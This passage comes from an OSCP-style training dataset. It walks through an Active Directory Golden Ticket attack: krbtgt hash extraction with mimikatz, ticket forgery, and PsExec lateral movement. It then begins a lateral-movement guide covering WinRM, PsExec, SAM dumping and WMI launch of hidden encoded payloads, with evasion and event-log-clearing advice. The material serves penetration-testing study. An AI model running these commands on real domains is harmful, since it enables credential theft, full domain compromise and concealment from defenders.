but SYSTEM guarantees success."", ""5. LAUNCH MIMIKATZ ON DC: Navigate to C:\\Tools on the DC (or wherever you've placed mimikatz.exe). Run 'mimikatz.exe'. You'll see the Mimikatz banner. Verify you're running with high privileges - Mimikatz should not show UAC warnings."", ""6. ENABLE DEBUG PRIVILEGE: Run 'privilege::debug' to obtain SeDebugPrivilege. This is REQUIRED for LSA dump because you're accessing LSASS.exe memory. You should see 'Privilege '20' OK'. If you see 'ERROR', you don't have sufficient privileges - ensure you're running as SYSTEM via PsExec."", ""7. EXECUTE LSA DUMP: Run the command 'lsadump::lsa /patch'. The /patch flag is CRITICAL on modern Windows Server versions (2012+). It patches LSASS memory to bypass protections that prevent credential dumping. Without /patch, the dump will fail with error 0x00000002 or show empty hash fields."", ""8. PARSE THE OUTPUT: LSA dump displays ALL domain account hashes, not just krbtgt. Output is extensive and can be overwhelming. Scroll through carefully looking for the krbtgt entry. Each account section shows: (a) RID - Relative Identifier (krbtgt is always 502 / 0x1f6), (b) User - Account name, (c) LM - Old LM hash (usually empty), (d) NTLM - The password hash we need. Find the section with 'RID  : 000001f6 (502)' and 'User : krbtgt'."", ""9. EXTRACT KRBTGT HASH: Under the krbtgt entry, copy the NTLM hash. Format: 32 hexadecimal characters. Example from output: 'RID  : 000001f6 (502) / User : krbtgt / LM   : / NTLM : 1693c6cefafffc7af11ef34d1c788f47'. Save '1693c6cefafffc7af11ef34d1c788f47' - this is your Golden Ticket key."", ""10. SAVE ADDITIONAL HASHES: LSA dump also displays Administrator, Guest, and all other domain accounts. Save these for potential password cracking, lateral movement, or creating multiple persistence mechanisms. The built-in Administrator hash (RID 500) is also valuable for direct DC access."", ""11. SAVE OUTPUT TO FILE: Consider redirecting output for later analysis: 'mimikatz # lsadump::lsa /patch > C:\\temp\\lsa_dump.txt'. This allows offline parsing and prevents missing important hashes during live scrolling. Remember to securely delete this file after extraction to remove forensic artifacts."", ""12. OPERATIONAL SECURITY: LSA dump is VERY noisy from a detection perspective. It triggers: (a) Event ID 10 (LSASS process access) in Sysmon logs, (b) Potential antivirus/EDR alerts (accessing LSASS is a common malware technique), (c) Memory integrity violations if Credential Guard is enabled. If stealth is required, DCSync is preferable. LSA dump should be used when you already have DC access and stealth is less critical.""], ""commands"": [""ad-golden-ticket-lsa-dump-krbtgt""], ""expected_outcome"": ""You successfully dump the Local Security Authority secrets from the Domain Controller's memory. The output displays password hashes for all domain accounts including Administrator (RID 500), Guest (RID 501), and krbtgt (RID 502). You extract the krbtgt NTLM hash: 1693c6cefafffc7af11ef34d1c788f47. The operation completes in 10-20 seconds. You now have the key data needed for Golden Ticket creation, plus additional Administrator and user hashes for lateral movement."", ""why_this_works"": ""LSA dump works because Domain Controllers cache password hashes in LSASS memory for authentication purposes. When a user authenticates, the DC must verify their password hash against the stored hash in Active Directory. For performance, these hashes are cached in the LSA subsystem's memory (LSASS.exe process). Mimikatz exploits the fact that any process with SeDebugPrivilege can read another process's memory. By reading LSASS memory and parsing the LSA data structures, Mimikatz extracts the cached password hashes. The /patch parameter bypasses modern protections (LSA Protection, Credential Guard checks) by temporarily modifying LSASS memory to disable validation routines. This is direct memory manipulation, not exploitation of a vulnerability."", ""common_mistakes"": [""Forgetting the /patch parameter (causes empty hash fields on modern Windows)"", ""Running as Administrator instead of SYSTEM (may fail on protected systems)"", ""Not running 'privilege::debug' first (access denied to LSASS memory)"", ""Executing on a member server instead of Domain Controller (only gets local SAM hashes)"", ""Confusing LM hash with NTLM hash (LM field is usually empty, NTLM is what you need)"", ""Scrolling past krbtgt entry too quickly (output is very long, easy to miss)"", ""Running with antivirus enabled (may block Mimikatz from accessing LSASS)""], ""oscp_exam_relevance"": ""MEDIUM - While DCSync is preferred in OSCP labs due to stealth and remote execution, LSA dump demonstrates understanding of Windows authentication architecture and credential extraction from memory. Useful when you've already compromised the DC and DCSync is unavailable or blocked. Shows technical depth in exam reports.""}, {""title"": ""Scenario 4: Creating and Injecting Golden Ticket with Mimikatz"", ""context"": ""You have successfully obtained the krbtgt NTLM hash (1693c6cefafffc7af11ef34d1c788f47) using either DCSync or LSA dump from previous scenarios. You have also gathered: Domain FQDN (corp.com), Domain SID (S-1-5-21-1987370270-658905905-1781884369), and confirmed an existing domain user account 'jen'. You are now back on the compromised workstation CLIENT74, logged in as the regular domain user 'corp\\jen' (NOT Domain Admin - demonstrating persistence). Your objective is to create a Golden Ticket that grants Domain Admin privileges to your low-privileged 'jen' account, inject it into memory, and verify the ticket is active."", ""objective"": ""Forge a Kerberos TGT using the krbtgt hash, inject it into the current session's ticket cache, and verify successful injection."", ""approach"": [""1. UNDERSTAND THE WORKFLOW: Golden Ticket creation has four phases: (a) Purge existing Kerberos tickets, (b) Create the forged TGT with krbtgt hash, (c) Inject ticket into memory, (d) Verify ticket is cached and usable. We'll perform all steps from a NON-PRIVILEGED user context to demonstrate that ticket creation doesn't require admin rights (only obtaining the krbtgt hash required elevated access)."", ""2. VERIFY PREREQUISITES: Ensure you have: krbtgt NTLM hash (32 hex chars), Domain SID (S-1-5-21-..., WITHOUT user RID), Domain FQDN (corp.com), existing username to impersonate (jen). Double-check the Domain SID - the most common mistake is including the user RID. If your 'whoami /user' shows 'S-1-5-21-1987370270-658905905-1781884369-1105', use only 'S-1-5-21-1987370270-658905905-1781884369'."", ""3. LAUNCH MIMIKATZ ON WORKSTATION: On CLIENT74 as user jen, navigate to C:\\Tools and run mimikatz.exe. You do NOT need to run as Administrator for ticket creation (though you did for obtaining the krbtgt hash initially). Mimikatz prompt appears: 'mimikatz #'."", ""4. PURGE EXISTING TICKETS: Run 'kerberos::purge' to delete all Kerberos tickets from your current session. Output should show 'Ticket(s) purge for current session is OK'. WHY: Existing legitimate tickets might interfere with your Golden Ticket. Purging ensures Windows will use the forged ticket. This is optional but highly recommended for clean injection."", ""5. VERIFY TICKET CACHE IS EMPTY: Run 'exit' to close Mimikatz temporarily, then run 'klist' from the command prompt. You should see 'No credentials cached' or 'Cached Tickets: (0)'. This confirms purge was successful. If tickets remain, close all SMB connections ('net use * /delete') and purge again."", ""6. CREATE THE GOLDEN TICKET: Return to Mimikatz and run the golden ticket command with all required parameters: 'kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt'. Let's break down each parameter: (a) /user:jen - The account to impersonate (MUST exist post-July 2022), (b) /domain:corp.com - Target AD domain FQDN, (c) /sid:<DOMAIN_SID> - Domain SID WITHOUT user RID, (d) /krbtgt:<HASH> - The krbtgt NTLM hash from DCSync, (e) /ptt - Pass The Ticket (auto-inject into memory)."", ""7. PARSE CREATION OUTPUT: Mimikatz displays detailed information about the forged ticket. Verify these fields: (a) 'User      : jen' - Confirms impersonated account, (b) 'Domain    : corp.com (CORP)' - Confirms target domain, (c) 'SID       : S-1-5-21-...' - Should match your Domain SID exactly, (d) 'User Id   : 500' - Mimikatz defaults to RID 500 (built-in Administrator), (e) 'Groups Id : *513 512 520 518 519' - Privileged groups including 512 (Domain Admins), (f) 'ServiceKey: [hash] - rc4_hmac_nt' - Confirms encryption type, (g) 'Golden ticket for 'jen @ corp.com' successfully submitted for current session' - Confirms injection."", ""8. UNDERSTAND THE FORGERY: Mimikatz automatically adds your user to the most privileged groups (Domain Admins, Enterprise Admins, Schema Admins, etc.) via the Groups Id field in the ticket's PAC (Privilege Attribute Certificate). Even though 'jen' is a low-privileged user in reality, the forged ticket claims she's a Domain Admin. The DC trusts this claim because the ticket is validly encrypted with the krbtgt hash."", ""9. VERIFY TICKET INJECTION: Exit Mimikatz (or open a new command prompt with 'misc::cmd') and run 'klist' to display cached tickets. You should see: (a) 'Client: jen @ CORP.COM', (b) 'Server: krbtgt/corp.com @ CORP.COM' - This indicates a TGT (not a service ticket), (c) 'KerbTicket Encryption Type: RC4-HMAC-NT', (d) 'Ticket Flags 0x40e10000' - Standard TGT flags (forwardable, renewable, etc.), (e) 'Start Time' and 'End Time' showing the ticket validity period (default: 10 years in the future!)."", ""10. VERIFY GROUP MEMBERSHIPS: Run 'whoami /groups' to see what Windows believes your current group memberships are. You should see: CORP\\Domain Admins, CORP\\Enterprise Admins, CORP\\Schema Admins, BUILTIN\\Administrators, and other privileged groups. These are derived from the forged ticket's PAC, not from Active Directory. The jen account in AD is still low-privileged, but your Kerberos ticket claims otherwise."", ""11. UNDERSTAND TICKET LIFETIME: The default Golden Ticket has a 10-year lifetime (Renew Time shows a date 10 years in the future). This is EXTREMELY suspicious from a detection perspective. Legitimate TGTs have lifetimes of 10 hours (default AD policy). For better OPSEC, use /startoffset, /endin, and /renewmax parameters to create realistic ticket lifetimes. Example: /endin:600 creates a ticket expiring in 10 hours (600 minutes)."", ""12. TROUBLESHOOTING INJECTION FAILURES: If 'klist' shows no tickets after creation: (a) Mimikatz may have shown an error during creation (scroll back and check), (b) You may be viewing a different session's tickets (open new cmd with 'mimikatz # misc::cmd'), (c) The ticket may have been created but not injected (missing /ptt flag - recreate with /ptt). If ticket exists but has wrong domain: Verify /domain parameter used FQDN (corp.com) not NetBIOS name (CORP).""], ""commands"": [""ad-golden-ticket-purge-tickets"", ""ad-golden-ticket-mimikatz-create"", ""ad-golden-ticket-verify-klist""], ""expected_outcome"": ""You successfully create a Golden Ticket for user 'jen' with forged Domain Admin privileges and inject it into memory. The 'klist' command shows a valid TGT for jen @ corp.com with Server: krbtgt/corp.com, indicating successful injection. 'whoami /groups' shows Domain Admins group membership even though jen is a regular user in Active Directory. You now have a domain-administrative Kerberos ticket ready for lateral movement. The entire process takes 15-30 seconds."", ""why_this_works"": ""The attack succeeds because Kerberos authentication is based on cryptographic trust, not centralized validation. When you present a TGT to request a service ticket, the KDC validates the TGT by decrypting it with the krbtgt hash. If decryption succeeds, the KDC trusts ALL claims in the ticket (username, group memberships, etc.) without checking Active Directory. There's no 'list of valid tickets' that the KDC maintains - ticket validity is purely cryptographic. Since our forged ticket is encrypted with the real krbtgt hash (which we stole), it decrypts correctly and is trusted. The KDC has no way to know we created the ticket ourselves versus it being legitimately issued. This is a fundamental limitation of the Kerberos protocol - the krbtgt hash is a single point of cryptographic failure for the entire domain."", ""common_mistakes"": [""Including user RID in /sid parameter (causes 'SID is too long' error)"", ""Using IP address instead of FQDN for /domain (ticket created but won't work for authentication)"", ""Forgetting /ptt flag (ticket created but not injected - must manually inject with 'kerberos::ptt <file>')"", ""Using non-existent username post-July 2022 (ticket creation fails or ticket rejected by DC)"", ""Incorrect krbtgt hash format (spaces, wrong length) causes 'Data length error'"", ""Checking tickets in wrong session (klist shows 'no credentials' even though ticket exists in another session)"", ""Not opening new command prompt after injection (old prompts don't inherit ticket - use 'misc::cmd')""], ""oscp_exam_relevance"": ""HIGH - This is the core Golden Ticket technique. OSCP exams require demonstrating post-exploitation persistence and lateral movement in Active Directory. Creating a Golden Ticket from a low-privileged account using stolen krbtgt hash shows complete understanding of Kerberos abuse, domain compromise, and persistence mechanisms. Essential for comprehensive AD attack documentation in exam reports.""}, {""title"": ""Scenario 5: Using Golden Ticket for Domain-Wide Access and Persistence"", ""context"": ""You have successfully created and injected a Golden Ticket in Scenario 4. Your 'klist' command confirms a valid TGT for jen @ corp.com with Server: krbtgt/corp.com. Your current context is a command prompt on CLIENT74 as user 'jen', but your Kerberos ticket claims Domain Admin privileges. The domain has multiple high-value targets: Domain Controller (DC1.corp.com, 192.168.50.70), File Server (FILES01.corp.com), Web Server (WEB01.corp.com). Your objective is to demonstrate domain-wide access by performing lateral movement to the Domain Controller, verify your privileged access, and understand persistence implications."", ""objective"": ""Use the Golden Ticket to authenticate to remote domain systems, demonstrating domain-wide administrative access and persistence capabilities."", ""approach"": [""1. UNDERSTAND KERBEROS VS NTLM AUTHENTICATION: This is CRITICAL for Golden Ticket usage. Windows authentication supports two protocols: Kerberos (default for domain) and NTLM (fallback for workgroup/IP-based). Golden Tickets ONLY work with Kerberos authentication. When you specify a target by HOSTNAME or FQDN (\\\\DC1 or \\\\DC1.corp.com), Windows uses Kerberos. When you specify by IP ADDRESS (\\\\192.168.50.70), Windows uses NTLM. Since your Golden Ticket is a Kerberos ticket, you MUST use hostnames, never IPs."", ""2. VERIFY GOLDEN TICKET IS ACTIVE: Before attempting lateral movement, run 'klist' to confirm your TGT is present. You should see 'Server: krbtgt/corp.com @ CORP.COM'. If tickets were purged or expired, recreate the Golden Ticket. Verify ticket expiration with End Time field - should be far in future (default 10 years)."", ""3. TEST ACCESS WITH DIR COMMAND: Before using PsExec, test basic SMB access to the Domain Controller. Run 'dir \\\\DC1.corp.com\\C$' to list the C: drive on DC1. This requires Domain Admin privileges (local admin on the DC). If successful, you'll see directory listing of C:\\. WHY THIS WORKS: The 'dir' command initiates SMB connection to CIFS/DC1.corp.com service. Windows requests a service ticket (TGS) from the KDC using your Golden Ticket (TGT). KDC issues the service ticket, and SMB authentication succeeds. If this fails with 'Access Denied', your Golden Ticket has an issue."", ""4. PREPARE PSEXEC: Ensure PsExec.exe is available. It's part of Sysinternals Suite and should be in C:\\Tools\\SysinternalsSuite\\. PsExec is a legitimate Microsoft tool for remote command execution via SMB. It works by: (a) Connecting to ADMIN$ share on target, (b) Uploading a service executable, (c) Starting the service via Service Control Manager, (d) Executing your command in service context (SYSTEM privileges)."", ""5. ATTEMPT LATERAL MOVEMENT WITH HOSTNAME: Run 'PsExec64.exe \\\\DC1 cmd.exe' to launch an interactive command prompt on the Domain Controller. PsExec connects using the HOSTNAME (DC1), which forces Kerberos authentication. Windows automatically presents your cached Golden Ticket for authentication. You should see: 'PsExec v2.4 - Execute processes remotely' followed by a new command prompt. The new prompt is running ON the Domain Controller."", ""6. VERIFY YOU'RE ON THE DC: In the new PsExec prompt, run verification commands: (a) 'hostname' - Should show 'DC1' (not CLIENT74), (b) 'ipconfig' - Should show IP 192.168.50.70 (DC's IP), (c) 'whoami' - Should show 'corp\\jen' (the account from your Golden Ticket), (d) 'whoami /groups' - Should show Domain Admins, Enterprise Admins, etc. (from forged ticket PAC). You now have command execution on the Domain Controller as a Domain Admin."", ""7. DEMONSTRATE THE IP ADDRESS FAILURE: To understand why hostnames are required, exit the PsExec session and try 'PsExec64.exe \\\\192.168.50.70 cmd.exe' (using IP instead of hostname). This will FAIL with 'Access is denied' even though the Golden Ticket is still valid. WHY: Using the IP forces NTLM authentication. NTLM requires the actual password hash of the user account (jen). Our Golden Ticket is a Kerberos-only credential and doesn't provide NTLM authentication material."", ""8. ACCESS ADDITIONAL DOMAIN RESOURCES: Test access to other domain systems. Try 'dir \\\\FILES01.corp.com\\Share', 'PsExec64.exe \\\\WEB01 cmd.exe', or 'net use \\\\APP01\\C$ /user:corp\\jen' (password not needed - Kerberos SSO). The Golden Ticket grants access to ANY domain resource because it claims Domain Admin privileges. You can access any file share, execute code on any server, dump credentials from any system."", ""9. UNDERSTAND PERSISTENCE IMPLICATIONS: Golden Tickets provide ULTIMATE persistence because: (a) The krbtgt password rarely changes (only on domain functional level upgrades), (b) Tickets can be created offline on non-domain systems (no network access needed), (c) You can create tickets for any existing user (low-privileged or disabled accounts work), (d) Tickets survive: Password changes (for any account except krbtgt), Account lockouts, Group Policy changes, Domain Admin account deletions. Even if all Domain Admin accounts are disabled, you can still create Golden Tickets."", ""10. DEMONSTRATE OFFLINE TICKET CREATION: To prove persistence, log out of the domain completely. Disconnect from network or join a workgroup. Run Mimikatz and create a new Golden Ticket with the same parameters. The ticket is created successfully even though you have NO network connectivity to the domain. Later, when you reconnect to the domain network, the ticket works for authentication. WHY: Ticket creation is purely local cryptography - Mimikatz encrypts the ticket data with the krbtgt hash locally, no DC communication needed."", ""11. RENEWAL AND LONG-TERM PERSISTENCE: Default Golden Tickets have 10-year expiration. For ongoing access, you can: (a) Create multiple tickets with staggered expirations, (b) Save the krbtgt hash securely for future ticket creation, (c) Use /renewmax parameter for renewable tickets (can extend lifetime without recreating). Before the ticket expires, create a new one using the saved krbtgt hash."", ""12. OPERATIONAL SECURITY CONSIDERATIONS: Golden Ticket usage generates logs that advanced SOCs monitor: (a) Event ID 4768 (TGT Request) - Shows 'unusual' TGT with long lifetime, (b) Event ID 4769 (Service Ticket Request) - Shows service ticket requests using RC4 (suspicious on modern networks), (c) Event ID 4672 (Special privileges assigned) - Shows Domain Admin logon from low-privileged account. For stealth: Use realistic ticket lifetimes (/endin:600 for 10 hours), use AES encryption instead of RC4 (requires AES krbtgt key with Rubeus), avoid excessive lateral movement, blend access patterns with normal user behavior."", ""13. CLEANUP (OPTIONAL): When finished, remove the Golden Ticket to reduce forensic footprint. Run 'mimikatz # kerberos::purge' to delete all tickets. Run 'net use * /delete /y' to close SMB connections. Consider clearing relevant event logs if you have permissions (wevtutil cl Security). However, remember that tickets are logged on the DC when used, so local cleanup doesn't erase all traces.""], ""commands"": [""ad-golden-ticket-verify-klist"", ""ad-golden-ticket-psexec-use"", ""ad-golden-ticket-cleanup""], ""expected_outcome"": ""You successfully use the Golden Ticket to perform lateral movement from CLIENT74 (low-privileged workstation) to DC1 (Domain Controller) using PsExec with hostname-based authentication. The command 'PsExec64.exe \\\\DC1 cmd.exe' succeeds and grants an interactive shell on the DC. Verification commands confirm you're on DC1 with IP 192.168.50.70, running as corp\\jen with Domain Admins group membership. The IP-based attempt (\\\\192.168.50.70) fails, demonstrating the requirement for Kerberos authentication. You have achieved complete domain compromise and persistent access via Golden Ticket. The attack chain is complete: Initial compromise -> Privilege Escalation -> krbtgt extraction -> Golden Ticket creation -> Domain-wide access -> Persistence."", ""why_this_works"": ""The lateral movement succeeds because PsExec (and all Windows authentication) automatically uses cached Kerberos tickets when connecting to hostnames. The authentication flow is: (1) PsExec initiates connection to \\\\DC1 (FQDN triggers Kerberos), (2) Windows checks ticket cache and finds your Golden Ticket (TGT for jen @ corp.com), (3) Windows requests service ticket for CIFS/DC1.corp.com from KDC using the Golden Ticket, (4) KDC validates the Golden Ticket by decrypting with krbtgt hash (succeeds because we encrypted it correctly), (5) KDC trusts the ticket's claims (Domain Admin group membership) and issues service ticket, (6) PsExec uses service ticket to authenticate to DC1, (7) DC1 checks service ticket, sees Domain Admins group, grants access. At no point does any system verify that jen is actually a Domain Admin in Active Directory - the ticket's cryptographic validity is sufficient proof. This is the fundamental design of Kerberos: the ticket IS the authentication, not a reference to authentication."", ""common_mistakes"": [""Using IP addresses instead of hostnames (forces NTLM, causes 'Access Denied')"", ""Forgetting to verify ticket with klist before attempting lateral movement"", ""Assuming failed lateral movement means ticket is invalid (might be firewall/network issue)"", ""Not understanding that Golden Ticket grants access to ALL systems, not just DC"", ""Thinking ticket needs to be recreated for each target (one ticket works for entire domain)"", ""Attempting to use Golden Ticket for non-Kerberos protocols (like WinRM over HTTP)"", ""Not verifying you're on target system after PsExec (assuming success without confirmation)""], ""oscp_exam_relevance"": ""HIGH - Lateral movement and domain-wide access demonstration is critical for OSCP exam reports. Using Golden Ticket to move from workstation to Domain Controller shows complete Active Directory compromise. The technique demonstrates: Post-exploitation persistence, Kerberos protocol understanding, Lateral movement methodology, Domain privilege escalation, Comprehensive attack chain documentation. This is the type of complete attack narrative that earns full points in OSCP AD scenarios.""}]","[{""title"": ""Phase 1: Prerequisites and Reconnaissance"", ""notes"": ""Gather required information and establish initial access. Golden Ticket requires Domain SID, domain FQDN, and krbtgt hash. The first two can be obtained from any domain user context. The krbtgt hash requires Domain Admin privileges or DC compromise (achieved through separate attack chain)."", ""commands"": []}, {""title"": ""Phase 2: Extract krbtgt Account Hash"", ""notes"": ""Obtain the krbtgt account NTLM hash using either DCSync (remote, stealthy) or LSA dump (requires DC access, noisy). DCSync is preferred in most scenarios as it doesn't require logging into the DC and generates less suspicious activity. Both methods require Domain Admin privileges or equivalent replication rights."", ""commands"": [{""id"": ""ad-golden-ticket-dcsync-krbtgt"", ""example"": ""mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt"", ""shows"": ""Output contains: 'Domain : <DOMAIN> / S-1-5-21-...'""}, {""id"": ""ad-golden-ticket-lsa-dump-krbtgt"", ""example"": ""mimikatz # lsadump::lsa /patch"", ""shows"": ""Output contains: 'Privilege '20' OK' (from privilege::debug)""}]}, {""title"": ""Phase 3: Create and Inject Golden Ticket"", ""notes"": ""Forge a Kerberos TGT using the krbtgt hash and inject it into memory. This can be performed from a non-privileged user context on any workstation (domain-joined or not). Purge existing tickets first for clean injection. Verify ticket creation with klist before attempting lateral movement."", ""commands"": [{""id"": ""ad-golden-ticket-purge-tickets"", ""example"": ""mimikatz # kerberos::purge"", ""shows"": ""Output: 'Ticket(s) purge for current session is OK'""}, {""id"": ""ad-golden-ticket-mimikatz-create"", ""example"": ""mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt"", ""shows"": ""Output: 'User      : <username>'""}, {""id"": ""ad-golden-ticket-rubeus-create"", ""example"": ""Rubeus.exe golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /rc4:1693c6cefafffc7af11ef34d1c788f47 /ptt"", ""shows"": ""Output: '[*] Action: Build TGT'""}, {""id"": ""ad-golden-ticket-verify-klist"", ""example"": ""klist"", ""shows"": ""Output contains: '#0>     Client: <username> @ <DOMAIN>'""}]}, {""title"": ""Phase 4: Lateral Movement and Domain Access"", ""notes"": ""Use the Golden Ticket to authenticate to domain resources and perform lateral movement. CRITICAL: Always use hostnames or FQDNs, never IP addresses (IPs force NTLM authentication which bypasses Kerberos tickets). The Golden Ticket grants domain-wide access to all systems and resources."", ""commands"": [{""id"": ""ad-golden-ticket-psexec-use"", ""example"": ""PsExec.exe \\\\DC1 cmd.exe"", ""shows"": ""Output: 'PsExec v2.4 - Execute processes remotely'""}]}, {""title"": ""Phase 5: Persistence and Cleanup (Optional)"", ""notes"": ""Golden Tickets provide long-term persistence because krbtgt password changes are rare. Save the krbtgt hash securely for future ticket creation. Tickets can be created offline and used when reconnecting to the network. For OPSEC, purge tickets and clear logs when operations are complete."", ""commands"": [{""id"": ""ad-golden-ticket-cleanup"", ""example"": ""mimikatz # kerberos::purge"", ""shows"": ""Output: 'Ticket(s) purge for current session is OK'""}]}]"
"ad-lateral-movement-techniques","Active Directory Lateral Movement - Complete Technique Guide","Comprehensive guide to Windows lateral movement: WMI, WinRM, PSExec, DCOM with decision tree, troubleshooting, and technique selection matrix","ACTIVE_DIRECTORY|LATERAL_MOVEMENT|WINRM|PSEXEC|WMI|DCOM|OSCP:HIGH","{""how_to_recognize"": [""You have valid domain credentials (password or NTLM hash) and need to move to other machines"", ""You've compromised one Windows machine and need to expand access across the domain"", ""Looking for the fastest/stealthiest way to execute commands on remote Windows systems"", ""Need to decide between WMI, WinRM, PSExec, or DCOM based on what ports are open and what you have available"", ""Troubleshooting why your lateral movement attempt failed (authentication vs. firewall vs. service disabled)""], ""when_to_look_for"": [""After obtaining credentials (plaintext, hash, or Kerberos ticket) from initial compromise"", ""When port scanning reveals SMB (445), RPC (135), or WinRM (5985/5986) open on targets"", ""Before attempting privilege escalation - sometimes lateral movement to another machine is easier than escalating on current host"", ""OSCP exam: Master ALL four techniques - different lab machines require different methods based on firewall rules and enabled services""]}","[{""title"": ""Scenario 1: Decision Tree - Which Lateral Movement Technique to Use?"", ""context"": ""You have domain credentials (corp\\jsmith:Password123) and nmap scan shows target 192.168.50.100 with ports 135, 139, 445, 5985 open. You need to decide: WMI, WinRM, PSExec, or DCOM? Each has different requirements, advantages, and failure modes. Making the wrong choice wastes exam time."", ""approach"": ""Use decision tree based on: (1) What ports are open? (2) What tools do you have available (Kali vs. compromised Windows machine)? (3) Do you need interactive shell or one-shot command execution? (4) Do you have password or just hash? (5) How stealthy do you need to be? Follow this priority order for OSCP: WinRM (easiest, interactive) \u2192 PSExec (most reliable, SYSTEM access) \u2192 WMI (fileless, stealthy) \u2192 DCOM (fallback when others blocked)."", ""commands"": [""lateral-movement-decision-tree"", ""lateral-movement-port-check""], ""expected_outcome"": ""Decision tree output: Port 5985 open \u2192 WinRM available \u2192 Try Evil-WinRM first (best interactive shell). If WinRM fails (service disabled despite port open, authentication failure), fall back to: Port 445 open \u2192 Try PSExec (most reliable). If PSExec fails (File and Printer Sharing disabled, service creation blocked), try: Port 135 open \u2192 Try WMI (works if Windows Firewall allows). If WMI fails (RPC blocked, WMI service disabled), final fallback: Port 135 open \u2192 Try DCOM (MMC20.Application). Decision tree saves 10-15 minutes of trial-and-error in exam."", ""why_this_works"": ""Each lateral movement technique has specific port and service requirements: WinRM (5985/5986, WinRM service enabled), PSExec (445, File and Printer Sharing + Admin$ accessible), WMI (135 + ephemeral high ports, WMI service enabled), DCOM (135 + ephemeral high ports, DCOM enabled). By checking ports first, you eliminate techniques that will definitely fail. By trying techniques in priority order (interactive > reliable > stealthy > obscure), you maximize success rate. This systematic approach beats randomly trying commands.""}, {""title"": ""Scenario 2: WinRM - Interactive PowerShell Remoting (Preferred Method from Kali)"", ""context"": ""You're on Kali with credentials corp\\admin:P@ssw0rd. Target 192.168.50.150 has port 5985 open (nmap output: 5985/tcp open http). You want the richest interactive shell with file upload/download capabilities. WinRM is Microsoft's official remote administration protocol - if it's enabled, it's your best option."", ""approach"": ""Test WinRM authentication first with CrackMapExec (crackmapexec winrm 192.168.50.150 -u admin -p P@ssw0rd -d corp). If you see [+] Pwn3d!, connect with Evil-WinRM (evil-winrm -i 192.168.50.150 -u admin -p P@ssw0rd). Evil-WinRM provides: interactive PowerShell, tab completion, command history, built-in upload/download commands, menu system. This is the closest you'll get to a native PowerShell session from Kali."", ""commands"": [""cme-winrm"", ""evil-winrm-creds"", ""evil-winrm-hash""], ""expected_outcome"": ""CrackMapExec output: 'WINRM 192.168.50.150 5985 HTTP [*] http://192.168.50.150:5985/wsman [+] corp\\admin:P@ssw0rd (Pwn3d!)'. Evil-WinRM connection: '*Evil-WinRM* PS C:\\Users\\admin>'. You now have fully interactive PowerShell. Upload tools: 'upload /opt/PowerUp.ps1 C:\\Temp\\PowerUp.ps1'. Run enumeration: 'Import-Module C:\\Temp\\PowerUp.ps1; Invoke-AllChecks'. Download loot: 'download C:\\Temp\\secrets.txt /home/kali/loot/secrets.txt'. WinRM session is stable, handles long-running commands, and provides best user experience."", ""why_this_works"": ""WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management protocol, designed for remote administration. When enabled (default on Server 2012+), it creates an HTTP listener on port 5985 (or HTTPS on 5986). Evil-WinRM leverages this to create PowerShell Remoting sessions. User must be in 'Remote Management Users' group or 'Administrators' group. WinRM uses Kerberos or NTLM authentication (supports pass-the-hash). Commands execute in user's context (not SYSTEM like PSExec). Advantages over other methods: fully interactive, supports file transfer natively, handles complex PowerShell scripts, official Microsoft protocol (less likely to be blocked).""}, {""title"": ""Scenario 3: PSExec - SYSTEM Shell (Most Reliable for Admin Credentials)"", ""context"": ""You have local admin credentials (.\\administrator:Password123) for workstation 192.168.50.75. Port 445 (SMB) is open. You need a SYSTEM-level shell to dump SAM hashes, access protected files (C:\\Windows\\System32\\config), or run tools that require highest privileges. PSExec is the gold standard for this use case."", ""approach"": ""Verify ADMIN$ share access first: crackmapexec smb 192.168.50.75 -u administrator -p Password123 --local-auth --shares (look for ADMIN$ with READ,WRITE). Then use Impacket PSExec: impacket-psexec administrator:Password123@192.168.50.75. PSExec uploads RemCom.exe to ADMIN$, creates Windows service, spawns cmd.exe as SYSTEM. You get immediate SYSTEM shell - no privilege escalation needed."", ""commands"": [""cme-smb-shares"", ""psexec-impacket-shell"", ""psexec-sysinternals""], ""expected_outcome"": ""CrackMapExec output: 'SMB 192.168.50.75 445 WORKSTATION [+] .\\administrator:Password123 (Pwn3d!) [+] Enumerated shares: ADMIN$ READ,WRITE'. Impacket PSExec output: '[*] Requesting shares on 192.168.50.75..... [*] Found writable share ADMIN$ [*] Uploading file yFqDNAzO.exe [*] Opening SVCManager on 192.168.50.75..... [*] Creating service ORfk on 192.168.50.75..... C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have highest privilege level. Dump SAM: 'reg save HKLM\\SAM C:\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Temp\\system.hive'. Access any file, kill any process, load kernel drivers."", ""why_this_works"": ""PSExec (SysInternals tool, Impacket reimplementation) works by: (1) Connecting to ADMIN$ share over SMB (port 445), (2) Copying executable to ADMIN$ (C:\\Windows), (3) Using Service Control Manager (SCM) via RPC (port 135) to create Windows service, (4) Starting service which spawns cmd.exe. Service runs in LocalSystem context \u2192 SYSTEM shell. Requirements: SMB port 445 accessible, File and Printer Sharing enabled (Windows Firewall exception), user has local admin rights (can access ADMIN$ and create services). PSExec is most reliable technique because: creates minimal artifacts (service logs), works on all Windows versions, provides SYSTEM immediately, well-documented behavior. Disadvantages: writes binary to disk (forensics), creates service event logs (Windows Event ID 7045), easier to detect than WMI.""}, {""title"": ""Scenario 4: WMI - Fileless Stealthy Execution (From Windows Machine)"", ""context"": ""You've compromised a Windows workstation (corp\\helpdesk session) and need to execute commands on another Windows machine (192.168.50.200) without dropping binaries to disk (AV evasion). You have domain credentials and PowerShell available. WMI provides fileless execution - commands run in memory only. Port 135 (RPC) is open on target."", ""approach"": ""Use PowerShell Invoke-WmiMethod or wmic from your Windows machine (NOT from Kali - wmic.exe is Windows-only, Impacket wmiexec is semi-interactive but less stable than Evil-WinRM). Create PSCredential object: $SecPass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('corp\\admin', $SecPass). Execute command via WMI: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>' -ComputerName 192.168.50.200 -Credential $Cred. No binaries 